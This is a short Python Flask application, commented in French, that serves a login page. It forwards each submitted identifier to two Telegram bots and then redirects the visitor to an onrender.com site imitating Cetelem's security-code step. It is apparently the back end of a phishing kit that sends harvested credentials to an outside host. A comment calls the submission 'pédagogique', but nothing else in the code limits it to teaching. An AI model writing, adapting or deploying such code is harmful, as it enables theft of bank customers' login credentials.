from dotenv import load_dotenv
from flask import Flask, render_template, request, redirect
import os
import requests

# Chargement du fichier .env
dotenv_path = os.path.join(os.path.dirname(__file__), '.env')
load_dotenv(dotenv_path=dotenv_path)

app = Flask(__name__)

# Bots Telegram
BOT_TOKEN_1 = os.getenv("BOT_TOKEN_1")
CHAT_ID_1 = os.getenv("CHAT_ID_1")

BOT_TOKEN_2 = os.getenv("BOT_TOKEN_2")
CHAT_ID_2 = os.getenv("CHAT_ID_2")


# Vérification des variables d'environnement
if not all([BOT_TOKEN_1, CHAT_ID_1, BOT_TOKEN_2, CHAT_ID_2]):
    raise ValueError("Une ou plusieurs variables d'environnement sont manquantes.")

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        identifiant = request.form.get('identifiant')

        if not identifiant:
            return "Identifiant manquant", 400

        message = f"🟢 Connexion pédagogique :\n\n🧑 Identifiant : {identifiant}"

        # Envoi aux trois bots
        bots = [
            (BOT_TOKEN_1, CHAT_ID_1),
            (BOT_TOKEN_2, CHAT_ID_2),
        ]

        for token, chat in bots:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            payload = {'chat_id': chat, 'text': message}
            response = requests.post(url, data=payload)

            if response.status_code != 200:
                return f"Erreur avec le bot {token[:10]}... : {response.text}", 500

        return redirect("https://cetelem-code-s-curit-l2qp.onrender.com/")

    return render_template('login.html')

if __name__ == '__main__':
    app.run(debug=True)
